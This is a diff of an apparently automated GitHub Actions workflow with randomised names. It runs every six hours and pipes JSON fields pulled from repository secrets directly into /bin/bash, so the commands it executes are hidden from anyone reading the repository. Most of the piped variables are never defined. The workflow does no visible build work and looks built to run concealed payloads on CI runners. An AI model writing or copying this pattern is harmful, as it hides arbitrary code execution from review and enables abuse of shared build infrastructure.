@@ -1,37 +1,27 @@
 name: wutiande7651
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 5/6 * * *'
-
-jobs:  # 9489
+    - cron: '38 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wutiande7651
         env:
-          ebt4513: ${{ secrets.ebt4513 }}
+          cwf7: ${{ secrets.cwf7 }}
         run: |
-          echo $ebt4513 | jq -r .cpl9 | /bin/bash
-          echo $imhy9 | jq -r .wcrue23 | /bin/bash
-          echo $dh30 | jq -r .kev36479 | /bin/bash
-          echo $brp02954 | jq -r .etpdu27 | /bin/bash
-          echo $zxijq3589 | jq -r .debhb4 | /bin/bash
-          echo $sew16238 | jq -r .r2 | /bin/bash
-          echo $myhdj807 | jq -r .xii7019 | /bin/bash
-          echo $hez0 | jq -r .hwv93 | /bin/bash
-          echo $mvs10 | jq -r .ymbmv89 | /bin/bash
-          echo $i6 | jq -r .ttu52 | /bin/bash
-          echo $xw38016 | jq -r .xp828 | /bin/bash
-          echo $tggmm7 | jq -r .vpbz03 | /bin/bash
-          echo $ojk4 | jq -r .gr958 | /bin/bash
-          echo $gnct4 | jq -r .mdl60502 | /bin/bash
-          echo $uzze32618 | jq -r .npxsd4 | /bin/bash
-          echo $n061 | jq -r .kwsq55214 | /bin/bash
-          echo $vwm1295 | jq -r .jihq84917 | /bin/bash
-          echo $ky9 | jq -r .jptsz87468 | /bin/bash
-          echo $uiktx750 | jq -r .alp1 | /bin/bash
-          echo $uv85197 | jq -r .uhm91527 | /bin/bash
+          echo $cwf7 | jq -r .ila0 | /bin/bash
+          echo $vdrz940 | jq -r .qwllh4 | /bin/bash
+          echo $cuhsm9 | jq -r .vc55608 | /bin/bash
+          echo $un08 | jq -r .b1 | /bin/bash
+          echo $qzop32016 | jq -r .g85 | /bin/bash
+          echo $q09199 | jq -r .jmaqz47940 | /bin/bash
+          echo $guv08 | jq -r .w79 | /bin/bash
+          echo $l56442 | jq -r .s43 | /bin/bash
+          echo $jprwr3540 | jq -r .q55112 | /bin/bash
+          echo $ewcl0226 | jq -r .fwwfo73518 | /bin/bash
+          echo $kwz0 | jq -r .mll30 | /bin/bash
 
